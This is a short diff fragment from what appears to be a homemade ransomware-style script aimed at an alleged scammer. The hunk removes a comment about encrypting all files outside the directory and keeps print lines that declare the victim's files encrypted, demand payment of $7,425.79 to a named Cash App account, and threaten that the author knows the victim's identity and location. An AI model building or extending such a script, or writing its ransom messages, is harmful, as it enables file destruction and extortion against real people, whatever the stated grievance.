@@ -125,12 +125,6 @@ print("Catastrophic actions completed.")
 
 
 
-#TODO: encrypt all files outside of directory
-
-
-
-
-
 print("Didnt your mom ever tell you to not scam innocent people?")
 print("All of your files have been encrypted. You will cashapp me ($SBussisoDube) the ammount you have written for the fraudulent check you sent me via email ($7,425.79 USD)")
 print("not only are your files encrypted I also have information on who you are and your real location despite your efforts to hide them")
